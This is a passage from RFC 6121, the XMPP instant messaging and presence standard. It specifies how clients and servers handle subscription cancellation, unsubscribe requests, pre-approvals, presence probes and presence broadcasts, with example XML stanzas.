[RFC 6121](/doc/html/rfc6121)                         XMPP IM                      March 2011

   CS: <presence from='juliet@example.com/balcony'
                 id='i8bsg3h3'
                 type='unavailable'/>

   CS: <presence from='juliet@example.com/chamber'
                 id='bvx2c9mk'
                 type='unavailable'/>

   Then the contact's server MUST route or deliver the presence stanza
   of type "unsubscribed" to the user, making sure to stamp the outbound
   subscription cancellation with the bare JID <contact@domainpart> of
   the contact.

   CS: <presence from='juliet@example.com'
                 id='ij5b1v7g'
                 to='romeo@example.net'
                 type='unsubscribed'/>

   The contact's server then MUST send a roster push with the updated
   roster item to all of the contact's interested resources, where the
   subscription state is now either "none" or "to" (see [Appendix A](#appendix-A)).

   CS: <iq id='pw3f2v175b34'
           to='juliet@example.com/balcony'
           type='set'>
         <query xmlns='jabber:iq:roster'>
           <item jid='romeo@example.net'
                 subscription='none'/>
         </query>
       </iq>

   CS: <iq id='zu2y3f571v35'
           to='juliet@example.com/chamber'
           type='set'>
         <query xmlns='jabber:iq:roster'>
           <item jid='romeo@example.net'
                 subscription='none'/>
         </query>
       </iq>

[3.2.3](#section-3.2.3).  Server Processing of Inbound Subscription Cancellation

   When the user's server receives the inbound subscription
   cancellation, it MUST first check if the contact is in the user's
   roster with subscription='to' or subscription='both' (see
   [Appendix A](#appendix-A)).  If this check is successful, then the user's server
   MUST:

Saint-Andre                  Standards Track                   [Page 41]
```

---

```

[RFC 6121](/doc/html/rfc6121)                         XMPP IM                      March 2011

   1.  Deliver the inbound subscription cancellation to all of the
       user's interested resources (this helps to give the user's
       client(s) proper context regarding the subscription cancellation
       so that they can differentiate between a roster push originated
       by another of the user's resources and a subscription
       cancellation received from the contact).  This MUST occur before
       sending the roster push described in the next step.

   US: <presence from='juliet@example.com'
                 id='ij5b1v7g'
                 to='romeo@example.net'
                 type='unsubscribed'/>

   2.  Initiate a roster push to all of the user's interested resources,
       containing an updated roster item for the contact with the
       'subscription' attribute set to a value of "none" (if the
       subscription state was "To" or "To + Pending In") or "from" (if
       the subscription state was "Both").

   US: <iq id='h37h3u1bv400'
           to='romeo@example.net/foo'
           type='set'>
         <query xmlns='jabber:iq:roster'>
           <item jid='juliet@example.com'
                 subscription='none'/>
         </query>
       </iq>

   US: <iq id='h37h3u1bv401'
           to='romeo@example.net/bar'
           type='set'>
         <query xmlns='jabber:iq:roster'>
           <item jid='juliet@example.com'
                 subscription='none'/>
         </query>
       </iq>

   The user's server MUST also deliver the inbound presence stanzas of
   type "unavailable".

      Implementation Note: If the user's account has no available
      resources when the inbound unsubscribed notification is received,
      the user's server MAY keep a record of the notification (ideally
      the complete presence stanza) and then deliver the notification
      when the account next has an available resource.  This behavior
      provides more complete signaling to the user regarding the reasons
      for the roster change that occurred while the user was offline.

Saint-Andre                  Standards Track                   [Page 42]
```

---

```

[RFC 6121](/doc/html/rfc6121)                         XMPP IM                      March 2011

   Otherwise -- that is, if the user does not exist, if the contact is
   not in the user's roster, or if the contact is in the user's roster
   with a subscription state other than those described in the foregoing
   check -- then the user's server MUST silently ignore the unsubscribed
   notification by not delivering it to the user, not modifying the
   user's roster, and not generating a roster push to the user's
   interested resources.

[3.3](#section-3.3).  Unsubscribing

[3.3.1](#section-3.3.1).  Client Generation of Unsubscribe

   If a user would like to unsubscribe from a contact's presence, it
   sends a presence stanza of type "unsubscribe".

   UC: <presence id='ul4bs71n'
                 to='juliet@example.com'
                 type='unsubscribe'/>

[3.3.2](#section-3.3.2).  Server Processing of Outbound Unsubscribe

   Upon receiving the outbound unsubscribe, the user's server MUST
   proceed as follows.

   1.  If the contact is hosted on the same server as the user, then the
       server MUST adhere to the rules specified under [Section 3.3.3](#section-3.3.3)
       when processing the subscription request.

   2.  If the contact is hosted on a remote server, subject to local
       service policies the user's server MUST then route the stanza to
       that remote domain in accordance with core XMPP stanza processing
       rules.  (This can result in returning an appropriate stanza error
       to the user, such as <remote-server-timeout/>.)

   As mentioned, before locally delivering or remotely routing the
   unsubscribe, the user's server MUST stamp the stanza with the bare
   JID <user@domainpart> of the user.

   US: <presence from='romeo@example.net'
                 id='ul4bs71n'
                 to='juliet@example.com'
                 type='unsubscribe'/>

   The user's server then MUST send a roster push with the updated
   roster item to all of the user's interested resources, where the
   subscription state is now either "none" or "from" (see [Appendix A](#appendix-A)).

Saint-Andre                  Standards Track                   [Page 43]
```

---

```

[RFC 6121](/doc/html/rfc6121)                         XMPP IM                      March 2011

   US: <iq id='h37h3u1bv402'
           to='romeo@example.net/foo'
           type='set'>
         <query xmlns='jabber:iq:roster'>
           <item jid='juliet@example.com'
                 subscription='none'/>
         </query>
       </iq>

   US: <iq to='romeo@example.net/bar'
           type='set'
           id='h37h3u1bv403'>
         <query xmlns='jabber:iq:roster'>
           <item jid='juliet@example.com'
                 subscription='none'/>
         </query>
       </iq>

[3.3.3](#section-3.3.3).  Server Processing of Inbound Unsubscribe

   When the contact's server receives the unsubscribe notification, it
   MUST first check if the user's bare JID is in the contact's roster
   with subscription='from' or subscription='both' (i.e., a subscription
   state of "From", "From + Pending Out", or "Both"; see [Appendix A](#appendix-A)).
   If this check is successful, then the contact's server MUST:

   1.  Deliver the inbound unsubscribe to all of the contact's
       interested resources (this helps to give the contact's client(s)
       proper context regarding the unsubscribe so that they can
       differentiate between a roster push originated by another of the
       contact's resources and an unsubscribe received from the user).
       This MUST occur before sending the roster push described in the
       next step.

   CS: <presence from='romeo@example.net'
                 id='ul4bs71n'
                 to='juliet@example.com'
                 type='unsubscribe'/>

   2.  Initiate a roster push to all of the contact's interested
       resources, containing an updated roster item for the user with
       the 'subscription' attribute set to a value of "none" (if the
       subscription state was "From" or "From + Pending Out") or "to"
       (if the subscription state was "Both").

Saint-Andre                  Standards Track                   [Page 44]
```

---

```

[RFC 6121](/doc/html/rfc6121)                         XMPP IM                      March 2011

   CS: <iq id='tn2b5893g1s4'
           to='juliet@example.com/balcony'
           type='set'>
         <query xmlns='jabber:iq:roster'>
           <item jid='romeo@example.net'
                 subscription='none'/>
         </query>
       </iq>

   CS: <iq id='sp3b56n27hrp'
           to='juliet@example.com/chamber'
           type='set'>
         <query xmlns='jabber:iq:roster'>
           <item jid='romeo@example.net'
                 subscription='none'/>
         </query>
       </iq>

   3.  Generate an outbound presence stanza of type "unavailable" from
       each of the contact's available resources to the user.

   CS: <presence from='juliet@example.com/balcony'
                 id='o5v91w49'
                 to='romeo@example.net'
                 type='unavailable'/>

   CS: <presence from='juliet@example.com/chamber'
                 id='n6b1c37k'
                 to='romeo@example.net'
                 type='unavailable'/>

      Implementation Note: If the contact's account has no available
      resources when the inbound unsubscribe notification is received,
      the contact's server MAY keep a record of the notification
      (ideally the complete presence stanza) and then deliver the
      notification when the account next has an available resource.
      This behavior provides more complete signaling to the user
      regarding the reasons for the roster change that occurred while
      the user was offline.

   Otherwise -- that is, if the contact does not exist, if the user is
   not in the contact's roster, or if the user's bare JID is in the
   contact's roster with a subscription state other than those described
   in the foregoing check -- then the contact's server MUST silently
   ignore the unsubscribe stanza by not delivering it to the contact,
   not modifying the contact's roster, and not generating a roster push
   to the contact's interested resources.  However, if the contact's
   server is keeping track of an inbound presence subscription request

Saint-Andre                  Standards Track                   [Page 45]
```

---

```

[RFC 6121](/doc/html/rfc6121)                         XMPP IM                      March 2011

   from the user to the contact but the user is not yet in the contact's
   roster (functionally equivalent to a subscription state of "None +
   Pending In" where the contact never added the user to the contact's
   roster), then the contact's server MUST simply remove any record of
   the inbound presence subscription request (it cannot remove the user
   from the contact's roster because the user was never added to the
   contact's roster).

      Implementation Note: The user's client MUST NOT depend on
      receiving the unavailable presence notification from the contact,
      since it MUST consider its presence subscription to the contact,
      and its presence information about the contact, to be null and
      void when it sends the presence stanza of type "unsubscribe" or
      when it receives the roster push triggered by the unsubscribe
      request.

[3.4](#section-3.4).  Pre-Approving a Subscription Request

   If a user has not received a subscription request from a contact, the
   user can "pre-approve" such a request so that it will be
   automatically approved by the user's server.

   Support for subscription pre-approvals is OPTIONAL on the part of
   clients and servers.  If a server supports subscription pre-
   approvals, then it MUST advertise the following stream feature during
   stream negotiation.

   <sub xmlns='urn:xmpp:features:pre-approval'/>

   The subscription pre-approval stream feature is merely informative
   and therefore is never mandatory-to-negotiate.

[3.4.1](#section-3.4.1).  Client Generation of Subscription Pre-Approval

   If the server to which a client connects has advertised support for
   subscription pre-approvals, the client MAY generate a subscription
   pre-approval by sending a presence stanza of type "subscribed" to the
   contact.

   UC: <presence id='pg81vx64'
                 to='juliet@example.com'
                 type='subscribed'/>

   If the server does not advertise support for subscription pre-
   approvals, the client MUST NOT attempt to pre-approve subscription
   requests from potential or actual contacts.

Saint-Andre                  Standards Track                   [Page 46]
```

---

```

[RFC 6121](/doc/html/rfc6121)                         XMPP IM                      March 2011

[3.4.2](#section-3.4.2).  Server Processing of Subscription Pre-Approval

   Upon receiving the presence stanza of type "subscribed", the user's
   server MUST proceed as follows if it supports subscription pre-
   approvals.

   1.  If the contact is in the user's roster with a state of "Both",
       "From", or "From + Pending Out", the user's server MUST silently
       ignore the stanza.

   2.  If the contact is in the user's roster with a state of "To +
       Pending In", "None + Pending In", or "None + Pending Out+In", the
       user's server MUST handle the stanza as a normal subscription
       approval (see under [Section 3.1.5](#section-3.1.5)) by updating the existing
       roster item to a state of "Both", "From", or "From + Pending Out"
       (respectively), pushing the modified roster item to all of the
       user's interested resources, and routing the presence stanza of
       type "subscribed" to the contact.

   3.  If the contact is in the user's roster with a state of "To",
       "None", or "None + Pending Out", the user's server MUST note the
       subscription pre-approval by setting the 'approved' flag to a
       value of "true", then push the modified roster item to all of the
       user's interested resources.  However, the user's server MUST NOT
       route the presence stanza of type "subscribed" to the contact.

   4.  If the contact is not yet in the user's roster, the user's server
       MUST create a roster item for the contact with a state of "None"
       and set the 'approved' flag to a value of "true", then push the
       roster item to all of the user's interested resources.  However,
       the user's server MUST NOT route the presence stanza of type
       "subscribed" to the contact.

   An example of the roster push follows.

   US: <iq id='h3bs81vs763f'
           to='romeo@example.net/bar'
           type='set'>
         <query xmlns='jabber:iq:roster'>
           <item approved='true'
                 jid='juliet@example.com'
                 subscription='none'/>
         </query>
       </iq>

   When the 'approved' flag is set to "true", the user's server MUST NOT
   deliver a presence stanza of type "subscribe" from the contact to the
   user, but instead MUST automatically respond to such a stanza on

Saint-Andre                  Standards Track                   [Page 47]
```

---

```

[RFC 6121](/doc/html/rfc6121)                         XMPP IM                      March 2011

   behalf of the user by returning a presence stanza of type
   "subscribed" from the bare JID of the user to the bare JID of the
   contact.

      Implementation Note: It is a matter of implementation or local
      service policy whether the server maintains a record of the
      subscription approval after it has received a presence
      subscription request from the contact.  If the server does not
      maintain such a record, upon receiving the subscription request it
      will not include the 'approved' attribute in the roster item for
      the contact (i.e., in subsequent roster pushes and roster
      results).  If the server maintains such a record, it will always
      include the 'approved' attribute (set to "true") in the roster
      item for the contact, until and unless the user sends a presence
      stanza of type "unsubscribed" to the contact (or removes the
      contact from the roster entirely).

      Implementation Note: A client can cancel a pre-approval by sending
      a presence stanza of type "unsubscribed", as described more fully
      under [Section 3.2](#section-3.2).  In this case, the user's server would send a
      roster push to all of the user's interested resources with the
      'approved' attribute removed.  (Alternatively, the client can
      simply remove the roster item entirely.)

[4](#section-4).  Exchanging Presence Information

[4.1](#section-4.1).  Presence Fundamentals

   The concept of presence refers to an entity's availability for
   communication over a network.  At the most basic level, presence is a
   boolean "on/off" variable that signals whether an entity is available
   or unavailable for communication (the terms "online" and "offline"
   are also used).  In XMPP, an entity's availability is signaled when
   its client generates a <presence/> stanza with no 'type' attribute,
   and an entity's lack of availability is signaled when its client
   generates a <presence/> stanza whose 'type' attribute has a value of
   "unavailable".

   XMPP presence typically follows a "publish-subscribe" or "observer"
   pattern, wherein an entity sends presence to its server, and its
   server then broadcasts that information to all of the entity's
   contacts who have a subscription to the entity's presence (in the
   terminology of [[IMP-MODEL](#ref-IMP-MODEL)], an entity that generates presence is a
   "presentity" and the entities that receive presence are
   "subscribers").  A client generates presence for broadcast to all
   subscribed entities by sending a presence stanza to its server with
   no 'to' address, where the presence stanza has either no 'type'
   attribute or a 'type' attribute whose value is "unavailable".  This

Saint-Andre                  Standards Track                   [Page 48]
```

---

```

[RFC 6121](/doc/html/rfc6121)                         XMPP IM                      March 2011

   kind of presence is called "broadcast presence".  (A client can also
   send "directed presence", i.e., a presence stanza with a 'to'
   address; this is less common but is sometimes used to send presence
   to entities that are not subscribed to the user's presence; see
   [Section 4.6](#section-4.6).)

   After a client completes the preconditions specified in [[XMPP-CORE](#ref-XMPP-CORE)],
   it can establish a "presence session" at its server by sending
   initial presence ([Section 4.2](#section-4.2)), where the presence session is
   terminated by sending unavailable presence ([Section 4.5](#section-4.5)).  For the
   duration of its presence session, a connected resource (in the
   terminology of [[XMPP-CORE](#ref-XMPP-CORE)]) is said to be an "available resource".

   In XMPP, applications that combine messaging and presence
   functionality, the default type of communication for which presence
   signals availability is messaging; however, it is not necessary for
   XMPP applications to combine messaging and presence functionality,
   and they can provide standalone presence features without messaging
   (in addition, XMPP servers do not require information about network
   availability in order to successfully route message and IQ stanzas).

      Informational Note: In the examples that follow, the user is
      <juliet@example.com>, she has two available resources ("balcony"
      and "chamber"), and she has three contacts in her roster with a
      subscription state of "from" or "both": <romeo@example.net>,
      <mercutio@example.com>, and <benvolio@example.net>.

[4.2](#section-4.2).  Initial Presence

[4.2.1](#section-4.2.1).  Client Generation of Initial Presence

   After completing the preconditions described in [[XMPP-CORE](#ref-XMPP-CORE)]
   (REQUIRED) and requesting the roster (RECOMMENDED), a client signals
   its availability for communication by sending "initial presence" to
   its server, i.e., a presence stanza with no 'to' address (indicating
   that it is meant to be broadcast by the server on behalf of the
   client) and no 'type' attribute (indicating the user's availability).

   UC: <presence/>

   The initial presence stanza MAY contain the <priority/> element, the
   <show/> element, and one or more instances of the <status/> element,
   as well as extended content; details are provided under [Section 4.7](#section-4.7).

Saint-Andre                  Standards Track                   [Page 49]
```

---

```

[RFC 6121](/doc/html/rfc6121)                         XMPP IM                      March 2011

[4.2.2](#section-4.2.2).  Server Processing of Outbound Initial Presence

   Upon receiving initial presence from a client, the user's server MUST
   send the initial presence stanza from the full JID
   <user@domainpart/resourcepart> of the user to all contacts that are
   subscribed to the user's presence; such contacts are those for which
   a JID is present in the user's roster with the 'subscription'
   attribute set to a value of "from" or "both".

   US: <presence from='juliet@example.com/balcony'
                 to='romeo@example.net'/>

   US: <presence from='juliet@example.com/balcony'
                 to='mercutio@example.com'/>

   US: <presence from='juliet@example.com/balcony'
                 to='benvolio@example.net'/>

   The user's server MUST also broadcast initial presence from the
   user's newly available resource to all of the user's available
   resources, including the resource that generated the presence
   notification in the first place (i.e., an entity is implicitly
   subscribed to its own presence).

   [... to the "balcony" resource ...]

   US: <presence from='juliet@example.com/balcony'
                 to='juliet@example.com'/>

   [... to the "chamber" resource ...]

   US: <presence from='juliet@example.com/balcony'
                 to='juliet@example.com'/>

   In the absence of presence information about the user's contacts, the
   user's server MUST also send presence probes to the user's contacts
   on behalf of the user as specified under [Section 4.3](#section-4.3).

[4.2.3](#section-4.2.3).  Server Processing of Inbound Initial Presence

   Upon receiving presence from the user, the contact's server MUST
   deliver the user's presence stanza to all of the contact's available
   resources.

   [ ... to resource1 ... ]

   CS: <presence from='juliet@example.com/balcony'
                 to='romeo@example.net'/>

Saint-Andre                  Standards Track                   [Page 50]
```

---

```

[RFC 6121](/doc/html/rfc6121)                         XMPP IM                      March 2011

   [ ... to resource2 ... ]

   CS: <presence from='juliet@example.com/balcony'
                 to='romeo@example.net'/>

[4.2.4](#section-4.2.4).  Client Processing of Initial Presence

   When the contact's client receives presence from the user, the
   following behavior is suggested for interactive clients:

   1.  If the user's bare JID is in the contact's roster, display the
       presence information in an appropriate roster interface.

   2.  If the user is not in the contact's roster but the contact and
       the user are actively exchanging message or IQ stanzas, display
       the presence information in the user interface for that
       communication session (see also [Section 4.6](#section-4.6) and [Section 5.1](#section-5.1)).

   3.  Otherwise, ignore the presence information and do not display it
       to the contact.

[4.3](#section-4.3).  Presence Probes

   A "presence probe" is a request for a contact's current presence
   information, sent on behalf of a user by the user's server;
   syntactically it is a presence stanza whose 'type' attribute has a
   value of "probe".  In the context of presence subscriptions, the
   value of the 'from' address MUST be the bare JID of the subscribed
   user and the value of the 'to' address MUST be the bare JID of the
   contact to which the user is subscribed, since presence subscriptions
   are based on the bare JID.

   US: <presence from='juliet@example.com'
                 id='ign291v5'
                 to='romeo@example.net'
                 type='probe'/>

      Interoperability Note: [RFC 3921](/doc/html/rfc3921) specified that probes are sent
      from the full JID, not the bare JID (a rule that was changed
      because subscriptions are based on the bare JID).  Some existing
      implementations send from the full JID instead of the bare JID.

   Probes can also be sent by an entity that has received presence
   outside the context of a presence subscription, typically when the
   contact has sent directed presence as described under [Section 4.6](#section-4.6); in
   this case the value of the 'from' or 'to' address can be a full JID
   instead of a bare JID.  See [Section 4.6](#section-4.6) for a complete discussion.

Saint-Andre                  Standards Track                   [Page 51]
```

---

```

[RFC 6121](/doc/html/rfc6121)                         XMPP IM                      March 2011

   Presence probes SHOULD NOT be sent by a client, because in general a
   client will not need to send them since the task of gathering
   presence from a user's contacts is managed by the user's server.
   However, if a user's client generates an outbound presence probe then
   the user's server SHOULD route the probe (if the contact is at
   another server) or process the probe (if the contact is at the same
   server) and MUST NOT use its receipt of the presence probe from a
   connected client as the sole cause for returning a stanza or stream
   error to the client.

[4.3.1](#section-4.3.1).  Server Generation of Outbound Presence Probe

   When a server needs to discover the availability of a user's contact,
   it sends a presence probe from the bare JID <user@domainpart> of the
   user to the bare JID <contact@domainpart> of the contact.

      Implementation Note: Although presence probes are intended for
      sending to contacts (i.e., entities to which a user is
      subscribed), a server MAY send a presence probe to the full JID of
      an entity from which the user has received presence information
      during the current session.

   The user's server SHOULD send a presence probe whenever the user
   starts a new presence session by sending initial presence; however,
   the server MAY choose not to send the probe at that point if it has
   what it deems to be reliable and up-to-date presence information
   about the user's contacts (e.g., because the user has another
   available resource or because the user briefly logged off and on
   before the new presence session began).  In addition, a server MAY
   periodically send a presence probe to a contact if it has not
   received presence information or other traffic from the contact in
   some configurable amount of time; this can help to prevent "ghost"
   contacts who appear to be online but in fact are not.

   US: <presence from='juliet@example.com'
                 id='ign291v5'
                 to='romeo@example.net'
                 type='probe'/>

   US: <presence from='juliet@example.com'
                 id='xv291f38'
                 to='mercutio@example.com'
                 type='probe'/>

   Naturally, the user's server does not need to send a presence probe
   to a contact if the contact's account resides on the same server as
   the user, since the server possesses the contact's information
   locally.

Saint-Andre                  Standards Track                   [Page 52]
```

---

```

[RFC 6121](/doc/html/rfc6121)                         XMPP IM                      March 2011

[4.3.2](#section-4.3.2).  Server Processing of Inbound Presence Probe

   Upon receiving a presence probe to the contact's bare JID from the
   user's server on behalf of the user, the contact's server MUST reply
   as follows:

   1.  If the contact account does not exist or the user's bare JID is
       in the contact's roster with a subscription state other than
       "From", "From + Pending Out", or "Both" (as explained under
       [Appendix A](#appendix-A)), then the contact's server SHOULD return a presence
       stanza of type "unsubscribed" in response to the presence probe
       (this will trigger a protocol flow for canceling the user's
       subscription to the contact as described under [Section 3.2](#section-3.2);
       however, this MUST NOT result in cancellation of a subscription
       pre-approval as described under [Section 3.4](#section-3.4)).  Here the 'from'
       address MUST be the bare JID of the contact, since specifying a
       full JID would constitute a presence leak as described in
       [[XMPP-CORE](#ref-XMPP-CORE)].

   CS: <presence from='mercutio@example.com'
                 id='xv291f38'
                 to='juliet@example.com'
                 type='unsubscribed'/>

   However, if a server receives a presence probe from a configured
   domain of the server itself or another such trusted service, it MAY
   provide presence information about the user to that entity.

   2.  Else, if the contact has moved temporarily or permanently to
       another address, then the server SHOULD return a presence stanza
       of type "error" with a stanza error condition of <redirect/>
       (temporary) or <gone/> (permanent) that includes the new address
       of the contact.

   CS: <presence from='mercutio@example.com'
                 id='xv291f38'
                 to='juliet@example.com'
                 type='error'>
         <error type='modify'>
           <gone xmlns='urn:ietf:params:xml:ns:xmpp-stanzas'>
             xmpp:la-mer@example.com
           </gone>
         </error>
       </presence>

   3.  Else, if the contact has no available resources, then the server
       SHOULD reply to the presence probe by sending to the user a
       presence stanza of type "unavailable" (although sending

Saint-Andre                  Standards Track                   [Page 53]
```

---

```

[RFC 6121](/doc/html/rfc6121)                         XMPP IM                      March 2011

       unavailable presence here is preferable because it results in a
       deterministic answer to the probe, it is not mandatory because it
       can greatly increase the number of presence notifications
       generated by the contact's server).  Here the 'from' address is
       the bare JID because there is no available resource associated
       with the contact.  If appropriate in accordance with local
       security policies this presence notification MAY include the full
       XML of the last unavailable presence stanza that the server
       received from the contact (including the 'id' of the original
       stanza), but if not then the presence notification SHOULD simply
       indicate that the contact is unavailable without any of the
       details originally provided.  In any case, the presence
       notification returned to the probing entity SHOULD include
       information about the time when the last unavailable presence
       stanza was generated (formatted using the XMPP delayed delivery
       extension [[DELAY](#ref-DELAY "\"Delayed Delivery\"")]).

   CS: <presence from='mercutio@example.com'
                 id='xv291f38'
                 to='juliet@example.com'
                 type='unavailable'>
         <delay xmlns='urn:xmpp:delay'
                stamp='2002-09-10T23:41:07Z'/>
       </presence>

   4.  Else, if the contact has at least one available resource, then
       the server MUST reply to the presence probe by sending to the
       user the full XML of the last presence stanza with no 'to'
       attribute received by the server from each of the contact's
       available resources.  Here the 'from' addresses are the full JIDs
       of each available resource.

   CS: <presence from='romeo@example.net/foo'
                 id='hzf1v27k'
                 to='juliet@example.com'/>

   CS: <presence from='romeo@example.net/bar'
                 id='ps6t1fu3'
                 to='juliet@example.com'>
         <show>away</show>
       </presence>

      Implementation Note: By "full XML" is meant the complete stanza
      from the opening <presence> tag to the closing </presence> tag,
      including all elements and attributes whether qualified by the
      content namespace or extended namespaces; however, in accordance

Saint-Andre                  Standards Track                   [Page 54]
```

---

```

[RFC 6121](/doc/html/rfc6121)                         XMPP IM                      March 2011

      with [[XMPP-CORE](#ref-XMPP-CORE)], the contact's server will need to transform the
      content namespace from 'jabber:client' to 'jabber:server' if it
      sends the complete stanza over a server-to-server stream.

   If the contact's server receives a presence probe addressed to a full
   JID of the contact, the server MUST NOT return presence information
   about any resource except the resource specified by the 'to' address
   of the probe.  Rules #1 and #2 for a bare JID probe apply equally to
   the case of a full JID probe.  If there is a resource matching the
   full JID and the probing entity has authorization via a presence
   subscription to see the contact's presence, then the server MUST
   return an available presence notification, which SHOULD communicate
   only the fact that the resource is available (not detailed
   information such as the <show/>, <status/>, <priority/>, or presence
   extensions).

   CS: <presence from='romeo@example.net/bar'
                 to='lobby@chat.example.com'/>

      Implementation Note: See [Section 4.6](#section-4.6) regarding rules that
      supplement the foregoing for handling of directed presence.

[4.3.2.1](#section-4.3.2.1).  Handling of the 'id' Attribute

   The handling of the 'id' attribute in relation to presence probes was
   unspecified in [RFC 3921](/doc/html/rfc3921).  Although the pattern of "send a probe and
   receive a reply" might seem like a request-response protocol similar
   to the XMPP <iq/> stanza, in fact it is not because the response to a
   probe might consist of multiple presence stanzas (one for each
   available resource currently active for the contact).  For this
   reason, if the contact currently has available resources then the
   contact's server SHOULD preserve the 'id' attribute of the contact's
   original presence stanza (if any) when sending those presence
   notifications to the probing entity.  By contrast, if the contact
   currently has no available resources, the probing entity is not
   authorized (via presence subscription) to see the contact's presence,
   or an error occurs in relation to the probe, then the contact's
   server SHOULD mirror the 'id' of the user's presence probe when
   replying to the probing entity.

   The following examples illustrate the difference.

   In the first scenario, Juliet sends presence from her "chamber"
   resource.

Saint-Andre                  Standards Track                   [Page 55]
```

---

```

[RFC 6121](/doc/html/rfc6121)                         XMPP IM                      March 2011

   CC: <presence from='juliet@example.com/chamber' id='pres1'>
         <show>dnd</show>
         <status>busy!</status>
       </presence>

   She also sends presence from her "balcony" resource.

   CC: <presence from='juliet@example.com/balcony' id='pres2'>
         <show>away</show>
         <status>stepped away</status>
       </presence>

   Romeo's server then sends a probe to Juliet.

   US: <presence from='romeo@example.net' id='probe1' type='probe'/>

   Juliet's server then sends both of her presence notifications to
   Romeo, preserving the 'id' attributes included in the stanzas that
   her client has sent.

   CS: <presence from='juliet@example.com/chamber' id='pres1'>
         <show>dnd</show>
         <status>busy!</status>
       </presence>

   CS: <presence from='juliet@example.com/balcony' id='pres2'>
         <show>away</show>
         <status>stepped away</status>
       </presence>

   In the second scenario, Juliet is offline when Romeo's server sends a
   probe.

   US: <presence from='romeo@example.net'
                 id='probe2'
                 type='probe'/>

   Juliet's server replies with an unavailable notification, mirroring
   the 'id' of Rome's presence probe because there is no 'id' to
   preserve from an available notification that her client has sent.

   CS: <presence from='juliet@example.com'
                 id='probe2'
                 type='unavailable'/>

Saint-Andre                  Standards Track                   [Page 56]
```

---

```

[RFC 6121](/doc/html/rfc6121)                         XMPP IM                      March 2011

[4.4](#section-4.4).  Subsequent Presence Broadcast

[4.4.1](#section-4.4.1).  Client Generation of Subsequent Presence Broadcast

   After sending initial presence, at any time during its session the
   user's client can update its availability for broadcast by sending a
   presence stanza with no 'to' address and no 'type' attribute.

   UC: <presence>
         <show>away</show>
       </presence>

   The presence broadcast MAY contain the <priority/> element, the
   <show/> element, and one or more instances of the <status/> element,
   as well as extended content; details are provided under [Section 4.7](#section-4.7).

   However, a user SHOULD send a presence update only to broadcast
   information that is relevant to the user's availability for
   communication or the communication capabilities of the resource.
   Information that is not relevant in this way might be of interest to
   the user's contacts but SHOULD be sent via other means, such as the
   "publish-subscribe" method described in [[XEP-0163](#ref-XEP-0163)].

[4.4.2](#section-4.4.2).  Server Processing of Subsequent Outbound Presence

   Upon receiving a presence stanza expressing updated availability, the
   user's server MUST broadcast the full XML of that presence stanza to
   the contacts who are in the user's roster with a subscription type of
   "from" or "both".

      Interoperability Note: [RFC 3921](/doc/html/rfc3921) specified that the user's server
      would check to make sure that it had not received a presence error
      from the contact before sending subsequent presence notifications.
      That rule has been removed because this specification uses
      presence stanzas of type "unsubscribe" (not "error") to solve
      subscription synchronization problems, in part because such
      stanzas change the contact's subscription state in the user's
      roster to either "none" or "to" (see [Section 3.3](#section-3.3) and [Appendix A](#appendix-A)),
      thus obviating the need for the error check.

      Interoperability Note: If the subscription type is "both", some
      existing server implementations send subsequent presence
      notifications to a contact only if the contact is online according
      to the user's server (that is, if the user's server never received
      a positive indication that the contact is online in response to
      the presence probe it sent to the contact, the user's server does
      not send subsequent presence notifications from the user to the

Saint-Andre                  Standards Track                   [Page 57]
```

---

```

[RFC 6121](/doc/html/rfc6121)                         XMPP IM                      March 2011

      contact).  This behavior is perceived to save bandwidth, since
      most presence subscriptions are bidirectional and many contacts
      will not be online at any given time.

   US: <presence from='juliet@example.com/balcony'
                 to='romeo@example.net'>
         <show>away</show>
       </presence>

   US: <presence from='juliet@example.com/balcony'
                 to='benvolio@example.net'>
         <show>away</show>
       </presence>

   US: <presence from='juliet@example.com/balcony'
                 to='mercutio@example.com'>
         <show>away</show>
       </presence>

      Implementation Note: See [Section 4.6](#section-4.6) regarding rules that
      supplement the foregoing for handling of directed presence.

   The user's server MUST also send the presence stanza to all of the
   user's available resources (including the resource that generated the
   presence notification in the first place).

   US: <presence from='juliet@example.com/balcony'
                 to='juliet@example.com/chamber'>
         <show>away</show>
       </presence>

   US: <presence from='juliet@example.com/balcony'
                 to='juliet@example.com/balcony'>
         <show>away</show>
       </presence>

[4.4.3](#section-4.4.3).  Server Processing of Subsequent Inbound Presence

   Upon receiving presence from the user, the contact's server MUST
   deliver the user's presence stanza to all of the contact's available
   resources.

   [ ... to resource1 ... ]

   CS: <presence from='juliet@example.com/balcony'
                 to='romeo@example.net'>
         <show>away</show>
       </presence>

Saint-Andre                  Standards Track                   [Page 58]
```

---

```

[RFC 6121](/doc/html/rfc6121)                         XMPP IM                      March 2011

   [ ... to resource2 ... ]

   CS: <presence from='juliet@example.com/balcony'
                 to='romeo@example.net'>
         <show>away</show>
       </presence>

[4.4.4](#section-4.4.4).  Client Processing of Subsequent Presence

   From the perspective of the contact's client, there is no significant
   difference between initial presence broadcast and subsequent
   presence, so the contact's client follows the rules for processing of
   inbound presence defined under [Section 4.4.3](#section-4.4.3).

[4.5](#section-4.5).  Unavailable Presence

[4.5.1](#section-4.5.1).  Client Generation of Unavailable Presence

   Before ending its presence session with a server, the user's client
   SHOULD gracefully become unavailable by sending "unavailable
   presence", i.e., a presence stanza that possesses no 'to' attribute
   and that possesses a 'type' attribute whose value is "unavailable".

   UC: <presence type='unavailable'/>

   Optionally, the unavailable presence stanza MAY contain one or more
   <status/> elements specifying the reason why the user is no longer
   available.

   UC: <presence type='unavailable'>
         <status>going on vacation</status>
       </presence>

   However, the unavailable presence stanza MUST NOT contain the
   <priority/> element or the <show/> element, since these elements
   apply only to available resources.

[4.5.2](#section-4.5.2).  Server Processing of Outbound Unavailable Presence

   The user's server MUST NOT depend on receiving unavailable presence
   from an available resource, since the resource might become
   unavailable ungracefully (e.g., the resource's XML stream might be
   closed with or without a stream error for any of the reasons
   described in [[XMPP-CORE](#ref-XMPP-CORE)]).

Saint-Andre                  Standards Track                   [Page 59]
```

---

```

[RFC 6121](/doc/html/rfc6121)                         XMPP IM                      March 2011

   If an available resource becomes unavailable for any reason (either
   gracefully or ungracefully), the user's server MUST broadcast
   unavailable presence to all contacts that are in the user's roster
   with a subscription type of "from" or "both".

      Interoperability Note: [RFC 3921](/doc/html/rfc3921) specified that the user's server
      would check to make sure that it had not received a presence error
      from the contact before sending unavailable presence
      notifications.  That rule has been removed because this
      specification uses presence stanzas of type "unsubscribe" (not
      "error") to solve subscription synchronization problems, in part
      because such stanzas change the contact's subscription state in
      the user's roster to either "none" or "to" (see [Section 3.3](#section-3.3) and
      [Appendix A](#appendix-A)), thus obviating the need for the error check.

      Implementation Note: Even if the user's server does not broadcast
